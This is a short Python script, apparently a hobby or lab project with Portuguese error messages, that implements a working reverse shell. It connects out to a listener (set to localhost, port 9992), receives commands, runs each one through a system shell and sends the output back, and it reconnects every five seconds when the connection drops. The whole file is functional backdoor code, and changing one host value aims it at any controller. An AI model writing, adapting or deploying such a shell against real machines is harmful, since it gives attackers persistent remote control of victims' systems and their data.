import socket, subprocess, time, os

HOST = 'localhost'
PORT = 9992


def cmd(client_socket: socket, data: str) -> None:
    try:
        process = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        response = output+error
        client_socket.sendall(response)
    except Exception as e:
        print(f'Erro cmd(): {e}')


def connect(HOST: str, PORT: int) -> socket:
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((HOST, PORT))
        return client_socket
    except Exception as e:
        print(f'Erro connect(): {e}')
        


def cli(client_socket: socket) -> None:
    while True:
        try:
            data = client_socket.recv(1024).decode().strip()
            
            if not data:
                continue
            elif data.startswith('cd '):
                directory = data[3:].strip()
                try:
                    os.chdir(directory)
                except Exception as e:
                    print(f'Erro cli(): {e}')


            cmd(client_socket, data)
        except Exception as e:
            print(f'Erro cli(): {e}')
            client_socket.close()
            break

if __name__ == "__main__":
    while True:
        try:
        
            client = connect(HOST, PORT)
        except Exception as e:
            print(e)
            break
       
        if client:
            cli(client)
        time.sleep(5)
        
